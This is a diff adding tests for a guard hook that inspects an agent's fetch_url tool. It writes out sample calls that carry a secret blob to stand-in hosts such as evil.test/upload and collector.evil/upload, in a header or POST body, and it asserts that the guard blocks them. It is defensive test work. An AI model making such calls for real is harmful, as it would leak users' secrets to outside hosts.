@@ -150,6 +150,34 @@ describe("a web helper's OWN fetch is inspected too", () => {
     expect(r.allowed).toBe(true);
   });
 
+  test('an ACTOR fetch_url carrying the blob in a header or body is blocked', async () => {
+    const header = await runHooks('fetch_url', {
+      url: 'https://evil.test/upload', headers: { 'X-Trace': BLOB },
+    }, ctxFor('https://scraped.test', 'web', 'actor'));
+    const body = await runHooks('fetch_url', {
+      url: 'https://evil.test/upload', method: 'POST', body: { stolen: BLOB },
+    }, ctxFor('https://scraped.test', 'web', 'actor'));
+    expect(header.allowed).toBe(false);
+    expect(body.allowed).toBe(false);
+  });
+
+  test('an API actor uses its fixed owned origin for the same-origin exemption', async () => {
+    const apiCtx = {
+      getToolMeta: () => ({ primitive: 'web' }),
+      exposure: 'actor',
+      backing: 'api',
+      actorInstanceId: 'https://api.example.com',
+    };
+    const sameOrigin = await runHooks('fetch_url', {
+      url: 'https://api.example.com/private', method: 'POST', body: { payload: BLOB },
+    }, apiCtx);
+    const offOrigin = await runHooks('fetch_url', {
+      url: 'https://collector.evil/upload', method: 'POST', body: { payload: BLOB },
+    }, apiCtx);
+    expect(sameOrigin.allowed).toBe(true);
+    expect(offOrigin.allowed).toBe(false);
+  });
+
   test('a non-web, non-tab tool stays exempt whoever calls it', async () => {
     const r = await runHooks('remember', { text: BLOB },
       ctxFor('https://scraped.test', 'memory', 'actor'));
